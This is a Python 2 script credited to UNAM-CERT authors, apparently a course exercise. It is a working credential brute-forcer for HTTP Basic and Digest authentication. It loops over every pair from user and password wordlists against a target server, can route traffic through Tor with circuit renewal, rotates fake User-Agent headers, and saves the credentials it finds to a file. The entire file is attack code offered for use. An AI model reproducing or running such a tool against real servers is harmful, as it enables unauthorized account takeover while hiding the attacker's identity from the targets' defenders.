#!/usr/bin/python
# -*- coding: utf-8 -*-
#José Sarmiento Campos, María Guadalupe Sarmiento Campos
#UNAM-CERT 

import sys
import optparse
from random import choice
from requests import get
from requests.auth import HTTPDigestAuth
from requests.exceptions import ConnectionError
from stem import Signal
from stem.control import Controller
import requests
import socks, socket
import time



cabec=['Guadalupe','Jose','otneimras','sopmac']

def torgen(num):
    """
    Funcion que implementa un socket con tor
    """
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password='my_password')
        socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr="127.0.0.1", port=9050)
        socket.socket = socks.socksocket
        controller.signal(Signal.NEWNYM)

def random_headers():
    """
    Funcion que regresa un User-Agent aleatorio
    """
    return {'User-Agent': choice(cabec)}

def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    """
    Opciones
    -v muestra todoooo lo que se hace
    -r report debe añadir'ambos' para mostrar en pantalla la impresas las credenciales encontradas, o 'archivo' para guardar las coincidencias en un archivo
    -t activa el modo tor si se añade 'tor'
    -a por defecto esta la autenticacion por basic pero si se agrega 'digest' se implementara esta autenticacion
    -S por defecto hace consultas http pero al agregar 'https' podremos realizar peticiones a servidores con https
    """
    parser = optparse.OptionParser()
    print '%s ' % (parser)
    parser.add_option('-v','--verbose', dest='verbose', default=None, action='store_true', help='If specified, prints detailed information during execution.')
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-a','--authentication', dest='auth', default='None', help='Kind of authentication.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-S','--http', dest='https', default='http', help='https enable.')
    parser.add_option('-r','--report', dest='report', default=None, help='File where the results will be reported.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-t', '--tor', dest='tor', default=None, help='Use tor.')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    """
    Valida que los capos de servidor, contraseñas y usuarios se considerarán en la ejecucion del programa
    """
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)
    elif options.user is None:
        printError('Especifique el archivo donde se encuentran los usuarios',True)
    elif options.password is None:
        printError('Especifique el archivo donde se encuentran las contraseñas',True)     
         

def reportResults():
    pass


def buildURL(server,port,protocol):
    url = '%s://%s:%s' % (protocol,server,port)
    #print url
    return url


def makeRequest(host, user, password,report,au,t,ver):
    """
    Se crea el Request con los parametros enviados y  tomando en cuenta las banderas con las que se ejecuto el programa
    """
    try:
	with open(user,'r') as usuario, open (password,'r') as contrasena, open ('usuarioscontrase.txt','w') as acceso:
            c=usuario.readlines()
            d=contrasena.readlines()
            if ver!= None:
                print 'Atacando'
            for i in c:
                a=i[:len(i)-1]
                for j in d:    
                    b=j[:len(j)-1]
                    usera=random_headers()
                    if t=='tor':
                        if au=='None':
                            response = requests.get(host, headers=usera,auth=(a,b))
                            
                            autentication='basic'
                        else:
                            #response = get(host,headers=usera,auth=HTTPDigestAuth(a,b))
                            response = requests.get(host,headers=usera,auth=HTTPDigestAuth(a,b))
                            
                            autentication='digest' 
                        #print(response.text)
                    else:    
                        if au=='None':
                            response = get(host, headers=usera,auth=(a,b))
                            autentication='basic'
                        else:
                            response = get(host,headers=usera,auth=HTTPDigestAuth(a,b)) 
                            autentication='digest'   
                    if response.status_code == 200:
                        #print report
	                if report=='ambas':
                         
                            print 'CREDENCIALES ENCONTRADAS!: %s\t%s. (Puede verificarlas n el archivo usuarioscontrase.txt)' % (a,b)
                            acceso.write('user\t%s\tpassword\t%s\tauthentication\t%s\thost\t%s\tUser-Agent\t%s\ttor\t%s\tIP\t%s\n' % (a,b,autentication,host,usera,t,response.text)) 
                        elif report=='archivo':
                            print 'CREDENCIALES ENCONTRADAS,VERIFICAR EN EL ARCHIVO usuarioscontrase.txt'
                            acceso.write('user\t%s\tpassword\t%s\tauthentication\t%s\thost\t%s\tUser-Agent\t%s\ttor\t%s\tIP\t%s\n' % (a,b,autentication,host,usera,t,response.text))
                        else:
                            print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (a,b)  
	            else:
	                print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)


if __name__ == '__main__':
    try:
        opts = addOptions()
	checkOptions(opts)
        url = buildURL(opts.server, port = opts.port,protocol=opts.https)
        if opts.verbose!=None:
            print 'Se utilizara \nProtocolo\t' +str(opts.https)+'\nTor\t'+str(opts.tor)+'\nAutenticacion\t'+str(opts.auth)+'\nAl servidor\t'+str(url)
        if opts.tor=='tor':
            try:    
                torgen('1')
            except Exception as e:
                printError ("Probablemente tor esta apagado amiguito")
                printError (e,True)
        makeRequest(url, opts.user, opts.password,opts.report,opts.auth,opts.tor,opts.verbose)
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
